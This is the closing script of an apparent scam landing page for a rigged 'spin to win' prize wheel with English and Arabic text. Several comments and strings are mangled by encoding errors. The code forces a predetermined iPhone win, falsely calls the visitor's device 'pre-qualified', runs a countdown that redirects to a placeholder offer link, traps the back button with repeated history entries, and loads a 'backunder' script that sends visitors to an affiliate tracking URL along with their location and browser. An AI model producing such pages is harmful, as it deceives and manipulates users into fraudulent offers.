    winText:"Ø£Ù†Øª Ø¹Ù„Ù‰ Ø¨ÙØ¹Ø¯ Ø®Ø·ÙˆØ© ÙˆØ§Ø­Ø¯Ø© Ù…Ù† Ø¬Ø§Ø¦Ø²ØªÙƒ! Ø§Ø¶ØºØ· Â«Ù…ØªØ§Ø¨Ø¹Ø©Â» Ù„Ø¥ØªÙ…Ø§Ù… Ø§Ù„Ø®Ø·ÙˆØ© Ø§Ù„Ø£Ø®ÙŠØ±Ø©.",
    claim:"Ù…ØªØ§Ø¨Ø¹Ø©"
  }
};
var sectors=i18n[LANG].sectors.slice();

function setQueryParam(key,val){
  var u = new URL(location.href);
  if (val==null) u.searchParams.delete(key); else u.searchParams.set(key,val);
  history.replaceState(null,'',u.toString());
}

function applyLang(){
  var T=i18n[LANG];
  document.getElementById('title').textContent=T.title;
  document.getElementById('attemptsLabel').textContent=T.attempts;
  document.getElementById('finalHint').textContent=T.hint;
  document.getElementById('timerLabel').textContent=T.timerLabel;

  var el;
  el=document.getElementById('introTitle'); if(el) el.textContent=T.introTitle;
  el=document.getElementById('introBtn');   if(el) el.textContent=T.ok;

  el=document.getElementById('st1Title'); if(el) el.textContent=T.st1Title;
  el=document.getElementById('st1Text');  if(el) el.textContent=T.st1Text;
  el=document.getElementById('st1Btn');   if(el) el.textContent=T.ok;

  el=document.getElementById('st2Title'); if(el) el.textContent=T.st2Title;
  el=document.getElementById('st2Text');  if(el) el.textContent=T.st2Text;
  el=document.getElementById('st2Btn');   if(el) el.textContent=T.ok;

  document.getElementById('winTitle').textContent=T.winTitle;
  document.getElementById('winText').innerHTML=T.winText;
  document.getElementById('claimBtn').textContent=T.claim;

  document.documentElement.lang=(LANG==='AR'?'ar':'en');
  document.documentElement.dir =(LANG==='AR'?'rtl':'ltr');

  // Ğ¿ĞµÑ€ĞµĞºĞ»ÑÑ‡Ğ°Ñ‚ĞµĞ»Ğ¸ (Ğ¿Ğ¾Ğ´ÑĞ²ĞµÑ‚ĞºĞ°)
  var btnEN = document.getElementById('btnEN');
  var btnAR = document.getElementById('btnAR');
  if(btnEN && btnAR){
    btnEN.classList.toggle('active', LANG==='EN');
    btnAR.classList.toggle('active', LANG==='AR');
  }
  var ie = document.getElementById('introEN');
  var ia = document.getElementById('introAR');
  if(ie && ia){
    ie.classList.toggle('active', LANG==='EN');
    ia.classList.toggle('active', LANG==='AR');
  }

  // wheel
  sectors=T.sectors.slice();
  buildWheel();
}

function setLang(next){
  if (next===LANG) return;
  LANG = next;
  setQueryParam('lang', next.toLowerCase());
  applyLang();
  fillIntroCopy();
}

function bindLangControls(){
  var btnEN = document.getElementById('btnEN');
  var btnAR = document.getElementById('btnAR');
  if(btnEN) btnEN.onclick = function(){ setLang('EN'); };
  if(btnAR) btnAR.onclick = function(){ setLang('AR'); };

  var ie = document.getElementById('introEN');
  var ia = document.getElementById('introAR');
  if(ie) ie.onclick = function(){ setLang('EN'); };
  if(ia) ia.onclick = function(){ setLang('AR'); };
}

/* ========= INTRO COPY ========= */
function detectUA(){
  var ua = navigator.userAgent || '';
  var isAndroid = /Android/i.test(ua);
  var isIphone  = /iPhone|iPad|iPod/i.test(ua);
  var isChrome  = /Chrome|CriOS/i.test(ua);
  var isSafari  = /Safari/i.test(ua) && !/Chrome|CriOS/i.test(ua);
  var isFirefox = /Firefox|FxiOS/i.test(ua);

  var devEN = isIphone ? "iOS" : (isAndroid ? "Android" : "your device");
  var devAR = isIphone ? "iOS" : (isAndroid ? "Android" : "Ø¬Ù‡Ø§Ø²Ùƒ");
  var brEN  = isChrome ? "Chrome" : isSafari ? "Safari" : isFirefox ? "Firefox" : "your browser";
  var brAR  = isChrome ? "Chrome" : isSafari ? "Safari" : isFirefox ? "Firefox" : "Ù…ØªØµÙØ­Ùƒ";
  return {devEN:devEN, devAR:devAR, brEN:brEN, brAR:brAR};
}
function safeIntroText(dev, br){
  var frag = document.createDocumentFragment();
  var s1 = document.createElement('span');
  var brEl = document.createElement('br');
  var s2 = document.createElement('span');

  if (LANG==='EN') {
    s1.textContent = "Today only: youâ€™re eligible to try your luck.";
    s2.append("Your ");
    var b1=document.createElement('b'); b1.textContent = dev;
    s2.append(b1, " on ");
    var b2=document.createElement('b'); b2.textContent = br;
    s2.append(b2, " is pre-qualified. Spin now!");
  } else {
    s1.textContent = "Ù„ÙØªØ±Ø© Ø§Ù„ÙŠÙˆÙ… ÙÙ‚Ø·: ØªÙ… ØªØ£Ù‡ÙŠÙ„Ùƒ Ù„ØªØ¬Ø±Ø¨Ø© Ø§Ù„Ø­Ø¸.";
    var b1a=document.createElement('b'); b1a.textContent = (dev==="your device" ? "Ø¬Ù‡Ø§Ø²Ùƒ" : dev);
    var b2a=document.createElement('b'); b2a.textContent = (br==="your browser" ? "Ù…ØªØµÙØ­Ùƒ" : br);
    s2.append(b1a, " Ù…Ø¹ ", b2a, " Ù…Ø¤Ù‡Ù„Ø§Ù† Ù…Ø³Ø¨Ù‚Ù‹Ø§. Ø§Ø¨Ø¯Ø£ Ø§Ù„Ø¢Ù†!");
  }
  frag.append(s1, brEl, s2);
  return frag;
}
function fillIntroCopy(){
  var T = i18n[LANG];
  var d = detectUA();
  var introTitle = document.getElementById('introTitle');
  var introText  = document.getElementById('introText');

  introTitle.textContent = T.introTitle;
  introText.innerHTML = "";
  introText.appendChild(safeIntroText(LANG==='EN'?d.devEN:d.devAR, LANG==='EN'?d.brEN:d.brAR));

  var badgeWrap = document.getElementById('introBadges');
  badgeWrap.innerHTML = '';
  T.introBadges.forEach(function(text){
    var span = document.createElement('span');
    span.className = 'badge';
    span.style.cssText = "background:#11304b;border:1px solid #29507a;padding:6px 10px;border-radius:999px;font-size:12px";
    span.textContent = text;
    badgeWrap.appendChild(span);
  });

  var ib = document.getElementById('introBtn'); if(ib) ib.textContent = (LANG==='EN') ? i18n.EN.ok : i18n.AR.ok;
}

/* ========= WHEEL (RASTER IMG) ========= */
var wheelEl = document.getElementById('wheelImg'); // ĞºÑ€ÑƒÑ‚Ğ¸Ğ¼ ĞºĞ°Ñ€Ñ‚Ğ¸Ğ½ĞºÑƒ
var N = 8, STEP = 360 / N;                          // Ğ½ÑƒĞ¶Ğ½Ñ‹ Ñ‚Ğ¾Ğ»ÑŒĞºĞ¾ Ğ´Ğ»Ñ Ñ€Ğ°ÑÑ‡Ñ‘Ñ‚Ğ¾Ğ² ÑƒĞ³Ğ»Ğ¾Ğ²

/* ========= THEME (wheel + accent colors) ========= */
var urlTheme = new URLSearchParams(location.search).get('theme'); // gb | gv
var THEMES = {
  gb: { src: 'img/wheel_1024-2.webp', offset: 22 }, // gold+blue
  gv: { src: 'img/wheel_1024-3m.webp', offset: 22 }  // green+violet
};
var THEME_KEY = (urlTheme||'gb').toLowerCase();
if (!THEME_KEY || !THEMES[THEME_KEY]) THEME_KEY = 'gb';

function applyTheme(){
  // data-Ğ°Ñ‚Ñ€Ğ¸Ğ±ÑƒÑ‚ Ğ½Ğ° <html> â€” Ğ´Ğ»Ñ CSS-Ğ¿ĞµÑ€ĞµĞºĞ»ÑÑ‡ĞµĞ½Ğ¸Ñ Ğ¿Ğ°Ğ»Ğ¸Ñ‚Ñ€Ñ‹
  document.documentElement.setAttribute('data-theme', THEME_KEY);

  // Ğ¿Ğ¾Ğ´Ğ¼ĞµĞ½ÑĞµĞ¼ ĞºĞ°Ñ€Ñ‚Ğ¸Ğ½ĞºÑƒ ĞºĞ¾Ğ»ĞµÑĞ° Ğ¸ Ğ¾Ñ„Ñ„ÑĞµÑ‚ Ğ¿Ğ¾Ğ´ ÑÑ‚Ñ€ĞµĞ»ĞºÑƒ
  var cfg = THEMES[THEME_KEY];
  if (wheelEl && wheelEl.src.indexOf(cfg.src) === -1) wheelEl.src = cfg.src;
  OFFSET = cfg.offset;
}


// Ñ€ĞµĞ½Ğ´ĞµÑ€Ğ¸Ñ‚ÑŒ Ğ½Ğ¸Ñ‡ĞµĞ³Ğ¾ Ğ½Ğµ Ğ½ÑƒĞ¶Ğ½Ğ¾ â€” ĞºĞ¾Ğ»ĞµÑĞ¾ ÑƒĞ¶Ğµ Ñ€Ğ°ÑÑ‚Ñ€Ğ¾Ğ²Ğ¾Ğµ
function buildWheel(){ /* no-op: using raster wheel image */ }



/* ========= GAME FLOW ========= */
var triesEl = document.getElementById('tries');
var spins = 0, currentAngle = 0;
var idxIphone = 0, idxBlue1 = 1, idxBlue2 = 3;
var sequence = [idxBlue1, idxBlue2, idxIphone];
var currentWinIdx = null; // Ğ¾ÑÑ‚Ğ°Ğ²Ğ¸Ğ¼, ĞµÑĞ»Ğ¸ Ğ³Ğ´Ğµ-Ñ‚Ğ¾ ĞµÑ‰Ñ‘ Ñ‡Ğ¸Ñ‚Ğ°ĞµÑ‚ÑÑ
var OFFSET = 22;

function setLangButtonsDisabled(v){
  var en = document.getElementById('btnEN');
  var ar = document.getElementById('btnAR');
  if(en) en.disabled = v;
  if(ar) ar.disabled = v;
}

function targetAngleForIndex(idx){
  var POINTER_ANGLE = -90; // ÑÑ‚Ñ€ĞµĞ»ĞºĞ° ÑĞ²ĞµÑ€Ñ…Ñƒ
  var center  = -90 + idx*STEP + STEP/2;
  var desired = POINTER_ANGLE - center + OFFSET;
  var delta   = ((desired - (currentAngle % 360)) + 360) % 360;
  var extra   = 360*5;
  var jitter  = (Math.random()*6 - 3);
  return currentAngle + extra + delta + jitter;
}

function doSpin(){
  if (spins >= 3 || !wheelEl) return;
  setLangButtonsDisabled(true);
  
  // Ğ²Ñ€ĞµĞ¼ĞµĞ½Ğ½Ğ¾ Ğ²ĞºĞ»ÑÑ‡Ğ°ĞµĞ¼ will-change Ğ¿ĞµÑ€ĞµĞ´ Ğ°Ğ½Ğ¸Ğ¼Ğ°Ñ†Ğ¸ĞµĞ¹
  wheelEl.style.willChange = 'transform';

  var idx = sequence[spins];
  currentWinIdx = idx;

  var target = targetAngleForIndex(idx);
  wheelEl.style.transition = 'transform 5.2s cubic-bezier(.22,.8,.25,1)'; // Ğ¿Ğ»Ğ°Ğ²Ğ½Ñ‹Ğ¹ ease-out Ğ±ĞµĞ· overshoot
  wheelEl.style.transform  = 'translateZ(0) rotateZ(' + target + 'deg)';
  wheelEl.addEventListener('transitionend', onEnd, { once:true });

  function onEnd(){
  // ÑĞ½Ğ¸Ğ¼Ğ°ĞµĞ¼ will-change, Ñ‡Ñ‚Ğ¾Ğ±Ñ‹ Ğ±Ñ€Ğ°ÑƒĞ·ĞµÑ€ Ğ½Ğµ Ğ´ĞµÑ€Ğ¶Ğ°Ğ» Ğ»Ğ¸ÑˆĞ½Ğ¸Ğ¹ ÑĞ»Ğ¾Ğ¹
    wheelEl.style.willChange = 'auto';

    currentAngle = target;
    spins++;
    triesEl.textContent = (3 - spins);

    if (spins === 1){
      var m1 = document.getElementById('stageModal1');
      m1.classList.add('show');
      setLangButtonsDisabled(false);
      document.getElementById('st1Btn').onclick = function(){
        m1.classList.remove('show'); setTimeout(doSpin, 350);
      };
    } else if (spins === 2){
      var m2 = document.getElementById('stageModal2');
      m2.classList.add('show');
      setLangButtonsDisabled(false);
      document.getElementById('st2Btn').onclick = function(){
        m2.classList.remove('show'); setTimeout(doSpin, 350);
      };
    } else {
      showWinModalDelayed();
    }
  }
}


/* ===== win popup ===== */
var modal=document.getElementById('winModal');
function showWinModalDelayed(){
/*   if(currentWinIdx !== null){
    var winPath = g.querySelector('path[data-idx="'+currentWinIdx+'"]');
    if (winPath) winPath.classList.add('sector-win');
  } */
  var DELAY_MS = 2000;
  setTimeout(function(){
    var box=document.getElementById('confetti');
    box.innerHTML='';
    for(var i=0;i<80;i++){
      var d=document.createElement('div');
      d.className='piece'+(['',' b',' c'][Math.floor(Math.random()*3)]);
      d.style.left=(Math.random()*100)+'%';
      d.style.animationDelay=(Math.random()*1.2)+'s';
      d.style.transform='translateY(-20px) rotate('+ (Math.random()*360) +'deg)';
      box.appendChild(d);
    }
    modal.classList.add('show');
    var cb=document.getElementById('claimBtn'); if(cb) cb.classList.add('pulse');
    setLangButtonsDisabled(false);
  }, DELAY_MS);
}

/* ===== countdown ===== */
var countdownEl = document.getElementById('countdown');
var timeLeft = 60;
var OFFER_LINK = '{offer_link}';
function tick(){
  countdownEl.textContent = timeLeft;
  if(timeLeft<=0){
    window.location.href = OFFER_LINK;
    return;
  }
  timeLeft--;
  setTimeout(tick,1000);
}

/* ===== INIT ===== */
function applyLangAndInit(){
  applyTheme();          // <â€” ĞĞĞ’ĞĞ•
  applyLang();
  fillIntroCopy();
  bindLangControls();
  tick();

  var intro = document.getElementById('introModal');
  intro.classList.add('show');

  var introBtn = document.getElementById('introBtn');
  introBtn.classList.add('pulse');
  introBtn.onclick = function(){
    introBtn.classList.remove('pulse');
    intro.classList.remove('show');
    setTimeout(doSpin,350);
  };
}
applyLangAndInit();

/* light back-trap */
(function trapBack(){
  try{
    var URL=location.href.split(/[#]/)[0];
    for(var i=0;i<10;i++) history.pushState({},"",URL+"#");
    onpopstate=function(e){ if(e.state) location.replace('#'); };
  }catch(_){}
})();
</script>

<!-- Backunder config -->
<script>
  // var back = '';
  var under   = 'https://mst.luvesso.com/click?key=f40ee2e1f280d169adb5&clickid={clickid}&campaign_id={campaign_id}&landing_id={landing_id}&country={country}&browser_name={browser_name}&language={language}&t9={t9}&city={city}';
  var delay   = 3000;
  var ctaClass = 'cta-button';
</script>
<script src="backunder.js" defer></script>
<!-- /Backunder -->

</body>
</html>
